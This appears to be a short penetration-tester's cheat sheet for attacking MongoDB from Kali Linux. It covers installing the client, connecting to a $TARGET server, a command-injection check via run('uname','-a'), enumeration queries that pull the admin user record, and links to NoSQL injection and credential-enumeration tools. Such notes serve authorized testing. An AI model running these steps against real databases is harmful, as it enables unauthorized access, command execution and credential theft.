[https://docs.mongodb.com/manual/tutorial/install-mongodb-on-debian/](https://docs.mongodb.com/manual/tutorial/install-mongodb-on-debian/)
```bash - kali
wget -qO - https://www.mongodb.org/static/pgp/server-5.0.asc | sudo apt-key add -
```
```bash - kali
sudo apt-get install gnupg
```
```bash - kali
wget -qO - https://www.mongodb.org/static/pgp/server-5.0.asc | sudo apt-key add -
```
```bash - kali
echo "deb http://repo.mongodb.org/apt/debian buster/mongodb-org/5.0 main" | sudo tee /etc/apt/sources.list.d/mongodb-org-5.0.list
```
```bash - kali
sudo apt-get update
```
```bash - kali
sudo apt-get install -y mongodb-org
```
```bash - kali
mongo "mongodb://$TARGET:27017"
```
```bash - kali
mongo "mongodb://username@$TARGET:27017"
```
#### Command Injection Check
https://cxsecurity.com/issue/WLB-2013030212
```bash - kali
run("uname","-a")
```
#### Database enumeration
```SQL
show dbs
```
```SQL
use <DATABASE>
```
```SQL
show collections
```
```SQL
db.<COLLECTION_NAME>.find()
```
```SQL
db.current.find({"username":"admin"})
```
---
#### Tools
https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration
https://github.com/C4l1b4n/NoSQL-Attack-Suite
